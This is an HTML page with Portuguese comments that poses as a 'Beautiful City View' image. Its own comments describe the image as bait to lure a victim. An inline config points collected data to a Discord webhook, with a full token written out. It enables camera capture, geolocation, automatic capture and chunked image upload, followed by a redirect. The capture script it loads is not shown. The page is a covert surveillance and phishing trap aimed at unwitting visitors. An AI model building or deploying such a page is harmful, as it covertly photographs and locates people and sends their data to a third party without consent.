<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <title>Beautiful City View</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { font-family: sans-serif; background:#0d1117; color:#c9d1d9; text-align:center; padding:3rem; }
    #status { font-size:1.25rem; margin-bottom:1rem; }
    #debugBox { max-width:600px; margin:1rem auto; text-align:left; white-space:pre-wrap; font-family:monospace; font-size:.85rem; background:#161b22; padding:1rem; border-radius:8px; display:none; }
    #trapContainer { text-align:center; padding:20px; display:none; }
    #trapImage { max-width:100%; height:auto; border-radius:8px; box-shadow:0 4px 8px rgba(0,0,0,0.3); }
    #trapContainer p { margin-top:10px; color:#666; }
  </style>
</head>
<body>
  <div id="status">Loading beautiful image...</div>
  <div id="debugBox"></div>
  
  <!-- Imagem isca para atrair a vítima -->
  <div id="trapContainer">
    <h2>Beautiful City View</h2>
    <img id="trapImage" src="" alt="Beautiful city view">
    <p>Click image to enlarge</p>
  </div>

  <!-- Config inline mínima (pode sobrescrever via osint-config.js ou querystring) -->
  <script>
    window.OSINT_CONFIG = {
      webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6XyXxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF", // ⚠️ TROQUE
      finalUrl: "https://www.exemplo.com",   // destino padrão
      requestCamera: true,   // tentar câmera?
      requestGeo: true,      // tentar geolocalização?
      redirectDelayMs: 3000, // atraso antes do redirect
      debug: true,           // mostrar logs na tela
      splitImage: true,      // dividir imagem em partes?
      chunkSize: 500000,     // tamanho máximo de cada parte (bytes)
      autoCapture: true,     // capturar imagem automaticamente?
      trapImage: "cityscape.jpg" // imagem isca para atrair vítima
    };
  </script>

  <!-- Importa config externa opcional (se existir; falha silenciosa) -->
  <script src="osint-config.js" defer></script>
  <!-- Script principal -->
  <script src="script.js" defer></script>
</body>
</html>
